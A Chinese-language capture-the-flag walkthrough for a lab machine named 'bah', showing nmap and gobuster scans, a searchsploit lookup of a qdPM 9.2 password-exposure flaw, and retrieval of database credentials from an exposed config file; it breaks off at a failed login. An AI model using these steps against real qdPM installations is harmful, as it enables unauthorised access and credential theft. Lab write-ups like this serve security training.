
|   |   |   |
|---|---|---|
|bah|easy|qdpmcms利用、mysql利用、host碰撞、shellinaboxd使用、pspy分析隐藏进程提权|


```c
┌──(kali㉿kali)-[~]
└─$ sudo netdiscover -i eth0 -r 192.168.44.141/24
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.141 
```
80 3306
```css
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.44.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,png -e
```

访问80发现是qdPMcms的网站，直接searchsploit
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit qdPM 
qdPM 9.2 - Cross-site Request Forgery (CSR | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthentica | php/webapps/50176.txt

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit -m php/webapps/50176.txt

https://www.exploit-db.com/exploits/50176
http://<website>/core/config/databases.yml
```

下载得到数据库的用户密码http://192.168.44.141/core/config/databases.yml
```c
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qpm;host=localhost'
      profiler: false
      username: qpmadmin
      password: "<?php echo urlencode('qpmpazzw') ; ?>"
      attributes:
        quote_identifier: true  
```

重新安装漏洞http://192.168.44.141/install
但是登陆时候确是404http://192.168.44.141/index.php/login
